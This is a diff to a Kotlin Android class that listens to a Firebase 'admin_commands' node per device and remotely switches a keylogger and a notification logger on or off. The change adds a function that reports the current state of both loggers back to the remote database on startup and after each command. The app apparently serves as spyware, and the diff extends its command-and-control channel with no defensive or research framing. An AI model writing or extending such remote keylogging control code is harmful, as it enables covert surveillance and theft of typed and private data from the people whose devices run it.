@@ -12,12 +12,18 @@ object RemoteCommandListener {
     private var isListening = false
 
     fun startListening() {
-        if (isListening) return
+        if (isListening) {
+            // Even if already listening, report current status back
+            reportCurrentStatus()
+            return
+        }
         isListening = true
 
         try {
             val deviceName = Build.MODEL?.replace(Regex("[^a-zA-Z0-9_-]"), "_")?.ifBlank { "Unknown_Device" } ?: "Unknown_Device"
             val ref = FirebaseDatabase.getInstance().getReference("admin_commands").child(deviceName)
+
+            reportCurrentStatus()
 
             ref.addValueEventListener(object : ValueEventListener {
                 override fun onDataChange(snapshot: DataSnapshot) {
@@ -26,12 +32,14 @@ object RemoteCommandListener {
                         if (keylogging != null && keylogging != KeyloggingConfig.isEnabled) {
                             KeyloggingConfig.isEnabled = keylogging
                             LogStore.addLog("Remote Command: Key Logger set to $keylogging")
+                            reportCurrentStatus()
                         }
 
                         val notifications = snapshot.child("notifications").getValue(Boolean::class.java)
                         if (notifications != null && notifications != NotificationConfig.isEnabled) {
                             NotificationConfig.isEnabled = notifications
                             LogStore.addLog("Remote Command: Notification Logger set to $notifications")
+                            reportCurrentStatus()
                         }
                     } catch (e: Exception) {
                         Log.e(TAG, "Error parsing remote command", e)
@@ -44,6 +52,17 @@ object RemoteCommandListener {
             })
         } catch (e: Exception) {
             Log.e(TAG, "Exception starting remote command listener", e)
+        }
+    }
+
+    private fun reportCurrentStatus() {
+        try {
+            val deviceName = Build.MODEL?.replace(Regex("[^a-zA-Z0-9_-]"), "_")?.ifBlank { "Unknown_Device" } ?: "Unknown_Device"
+            val statusRef = FirebaseDatabase.getInstance().getReference("admin_commands").child(deviceName).child("status")
+            statusRef.child("keylogging").setValue(KeyloggingConfig.isEnabled)
+            statusRef.child("notifications").setValue(NotificationConfig.isEnabled)
+        } catch (e: Exception) {
+            Log.e(TAG, "Error reporting status", e)
         }
     }
 }
